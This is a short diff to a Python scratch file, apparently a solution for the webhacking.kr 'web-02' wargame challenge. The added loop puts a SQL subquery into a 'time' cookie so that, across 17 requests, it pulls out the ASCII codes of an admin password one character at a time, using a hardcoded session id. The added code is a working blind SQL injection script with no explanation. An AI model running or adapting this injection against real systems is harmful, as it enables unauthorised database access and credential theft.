@@ -1,3 +1,4 @@
+import requests
 import random
 
 a = [1,2,3]
@@ -22,3 +23,9 @@ print(a.index(3))
 # f.write(''.join(arr))
 
 # f.close()
+
+for i in range(1,17+1):    
+    query = '(select ascii(substr(pw,'+str(i)+',1)) from admin_area_pw)'
+    cookies = {'session_id': '9duomlvvtajucp5p48gv53lm5d', 'time':query}
+    res = requests.get('https://webhacking.kr/challenge/web-02/', cookies=cookies)
+    print(res.text)
